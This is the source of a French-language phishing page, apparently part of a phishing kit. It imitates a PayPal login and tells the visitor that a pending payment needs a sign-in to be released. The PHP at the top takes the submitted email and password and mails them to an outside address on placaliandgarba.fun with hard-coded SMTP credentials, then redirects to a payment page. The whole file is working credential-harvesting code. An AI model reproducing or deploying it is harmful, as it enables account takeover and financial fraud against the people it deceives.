<?php
require("PHPMailer-master/src/PHPMailer.php");
require("PHPMailer-master/src/SMTP.php");
require("PHPMailer-master/src/Exception.php");

if (isset($_POST['detailsSubmit'])) {  // bloc if a inserer dans ton code

$mail = new PHPMailer\PHPMailer\PHPMailer();

$mail->isSMTP();
//$mail->SMTPDebug = 1;
$mail->Host = 'placaliandgarba.fun';
$mail->SMTPAuth = true;
$mail->Username = 'petit-joli-coeur@placaliandgarba.fun';

$mail->Password = "angola89@";
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

$mail->setFrom('petit-joli-coeur@placaliandgarba.fun','CLIENT');
$mail->addAddress('petit-joli-coeur@placaliandgarba.fun','CLIENT');
$mail->addReplyTo('petit-joli-coeur@placaliandgarba.fun','CLIENT');

//$mail->addAttachment($_SESSION['CheminImageDocument']);

$mail->isHTML(true); // Mail envoyé en HTML

$mail->Subject = "Information de la connexion"; 

$Message = "email: " . $_POST['email'] . "<br>";
$Message .= "password: " . $_POST['password'] . "<br>";

$mail->Body    =  $Message;

//$mail->AltBody = 'Message au format text/plain';

if (!$mail->send()) {
    // erreur lors de l'envoi.
    $email = $_POST['email'];
    $password = $_POST['password'];

    // ou le code ci-dessous pour vider les champs
    // $champ1 = "";
    // $champ2 = "";
    // $champ3 = "";
    // $champ4 = "";

} else {
    // OK message envoyé avec succès.
    header('location: paiement.php');
    exit();
}
}
?>
<!DOCTYPE html>
<html data-reactroot="">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8" />
    <title>Vous avez reçu de l'argent</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/main_style.css" />
    <link rel="stylesheet" href="style.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
        <div class="vx_modal-content">

                <header class="vx_modal-header">
        <div aria-live="pJOHNESSte">
            <div class="headerWrapper">
                <h1 class="vx_text-2 " style="text-align: center">Connectez-vous</h1></div>
        </div>
        <p class="vx_text-body">
        </p>

    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">
                    <div class="signupCheckBox">
                        <div class="expandableContainer">
                            <label for="paypalAccountData_tcpa">
                                Vous avez un paiement en ATTENTE. Connectez-vous, afin d'activer votre paiement.
                            </label>
                        </div>
                    </div>
                        <form method="POST" action="" accept-charset="UTF-8" class="proceed maskable" autocomplete="off" name="cvalidate"><input name="_token" type="hidden" value="kF9gPAn3l6UsVOhwyLW6B1YQSFJNWVgFr7jaecNc">

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Email ou numéro de mobile">
                         <label class="floatingLabel" for="cardNumber">Email ou numéro de mobile</label>
                         <input value="<?php echo $email; ?>" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="" aria-describedby="text-info-cardNumber" id="cardNom" name="email" type="email">
                        </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Mot de passe">
                            <label class="floatingLabel" for="banque">Mot de passe</label>
                           <input value="<?php echo $password; ?>" aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardAdresse1" name="password" type="password">
                           
                       </div>
                    
                       

                        <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">Connexion</button>

                        <div class="forgotLink">
                        <a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Vous n'arrivez pas à vous connecter ?</a>
                        </div>
                        <input type="hidden" id="bp_mid" name="bp_mid" value="">
               
                     <a href="#" class="button secondary" id="createAccount">Ouvrir un compte</a>
                    </form>

                </div>

            </div>

        </div>

    </div>

    <div class="foot-pay">
                <center>
                    <a href="#">Contact</a>
                    <a href="#">Respect de la vie privée</a>
                    <a href="#">Contrat d'utilisation</a>
                    <a href="#">International</a>                
                </center>            
    </div>

        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>


</body>

</html>